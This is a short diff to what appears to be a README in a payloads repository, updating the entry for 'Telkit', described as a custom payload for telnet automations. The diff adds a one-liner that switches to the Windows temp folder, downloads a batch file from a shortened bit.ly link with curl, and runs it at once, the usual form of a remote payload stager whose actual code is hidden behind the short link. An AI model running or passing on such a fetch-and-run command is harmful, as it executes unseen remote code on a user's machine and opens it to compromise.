@@ -4,5 +4,5 @@
 
 
 ## Telkit
-[Telkit]() is a custom payload for telnet run automations.
-```cmd /b start filename_or_URL```
+[Telkit](https://github.com/Jed556/Payloads/blob/main/Telkit/telkit.bat) is a custom payload for telnet run automations.
+```cmd /c cd %temp% & curl -Lo r.bat bit.ly/p-tk & r 1```
